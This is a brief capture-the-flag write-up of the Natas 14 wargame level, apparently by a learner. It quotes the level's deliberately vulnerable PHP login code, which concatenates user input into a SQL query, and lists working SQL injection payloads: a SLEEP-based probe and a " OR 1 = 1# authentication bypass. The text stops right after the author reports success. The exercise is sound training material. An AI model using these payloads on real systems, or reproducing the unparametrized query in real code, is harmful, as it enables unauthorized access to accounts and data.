This level is about blind sqlInyection, and gratefully they let us read the code:

<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?>

We can see the raw query, it's not parametrized and input it's not been sanitized. So I tried lots of querys, but the ones
returning a message where the ones that started with double quotes like the following: 

	->WORKS: " WHERE 1337=1337 RLIKE SLEEP(5)-- 1337

 And so i though about doing my own query, so i tried this one:
	-> " OR 1 = 1#

 Yay! success!:
